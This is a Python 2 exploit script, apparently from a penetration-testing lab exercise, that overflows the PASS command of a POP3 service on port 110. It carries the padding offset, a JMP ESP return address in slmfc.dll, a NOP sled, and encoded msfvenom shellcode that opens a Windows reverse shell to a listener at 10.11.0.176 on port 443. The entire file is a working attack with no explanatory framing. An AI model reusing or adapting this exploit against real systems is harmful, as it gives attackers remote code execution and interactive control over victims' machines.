#1/usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#msfvenom --payload windows/shell_reverse_tcp LHOST=10.11.0.176 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d'
#x86/shikata_ga_nai chosen with final size 351
#Final size of c file: 1500 bytes
shellcode = "\xd9\xee\xd9\x74\x24\xf4\xb8\xdc\xcd\x67\xd7\x5a\x2b\xc9\xb1"
"\x52\x31\x42\x17\x83\xea\xfc\x03\x9e\xde\x85\x22\xe2\x09\xcb"
"\xcd\x1a\xca\xac\x44\xff\xfb\xec\x33\x74\xab\xdc\x30\xd8\x40"
"\x96\x15\xc8\xd3\xda\xb1\xff\x54\x50\xe4\xce\x65\xc9\xd4\x51"
"\xe6\x10\x09\xb1\xd7\xda\x5c\xb0\x10\x06\xac\xe0\xc9\x4c\x03"
"\x14\x7d\x18\x98\x9f\xcd\x8c\x98\x7c\x85\xaf\x89\xd3\x9d\xe9"
"\x09\xd2\x72\x82\x03\xcc\x97\xaf\xda\x67\x63\x5b\xdd\xa1\xbd"
"\xa4\x72\x8c\x71\x57\x8a\xc9\xb6\x88\xf9\x23\xc5\x35\xfa\xf0"
"\xb7\xe1\x8f\xe2\x10\x61\x37\xce\xa1\xa6\xae\x85\xae\x03\xa4"
"\xc1\xb2\x92\x69\x7a\xce\x1f\x8c\xac\x46\x5b\xab\x68\x02\x3f"
"\xd2\x29\xee\xee\xeb\x29\x51\x4e\x4e\x22\x7c\x9b\xe3\x69\xe9"
"\x68\xce\x91\xe9\xe6\x59\xe2\xdb\xa9\xf1\x6c\x50\x21\xdc\x6b"
"\x97\x18\x98\xe3\x66\xa3\xd9\x2a\xad\xf7\x89\x44\x04\x78\x42"
"\x94\xa9\xad\xc5\xc4\x05\x1e\xa6\xb4\xe5\xce\x4e\xde\xe9\x31"
"\x6e\xe1\x23\x5a\x05\x18\xa4\x6f\xd1\x22\x84\x18\xe7\x22\xe5"
"\x63\x6e\xc4\x8f\x83\x27\x5f\x38\x3d\x62\x2b\xd9\xc2\xb8\x56"
"\xd9\x49\x4f\xa7\x94\xb9\x3a\xbb\x41\x4a\x71\xe1\xc4\x55\xaf"
"\x8d\x8b\xc4\x34\x4d\xc5\xf4\xe2\x1a\x82\xcb\xfa\xce\x3e\x75"
"\x55\xec\xc2\xe3\x9e\xb4\x18\xd0\x21\x35\xec\x6c\x06\x25\x28"
"\x6c\x02\x11\xe4\x3b\xdc\xcf\x42\x92\xae\xb9\x1c\x49\x79\x2d"
"\xd8\xa1\xba\x2b\xe5\xef\x4c\xd3\x54\x46\x09\xec\x59\x0e\x9d"
"\x95\x87\xae\x62\x4c\x0c\xde\x28\xcc\x25\x77\xf5\x85\x77\x1a"
"\x06\x70\xbb\x23\x85\x70\x44\xd0\x95\xf1\x41\x9c\x11\xea\x3b"
"\x8d\xf7\x0c\xef\xae\xdd"

#A up until EIP
#send EIP to a JMP ESP instruction in slmfc.dll
#8 bytes of nop
#lastly, out 351 byte shellcode
buffer = 'A' * 2606  + '\x8f\x35\x4a\x5f' + "\x90" * 8 + shellcode


try:
    print "Sending evil buffer..."
    s.connect(('10.11.23.10', 110))
    data = s.recv(1024)
    s.send('USER username + \r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print '\nDone!'
except:
    print 'something went wrong'
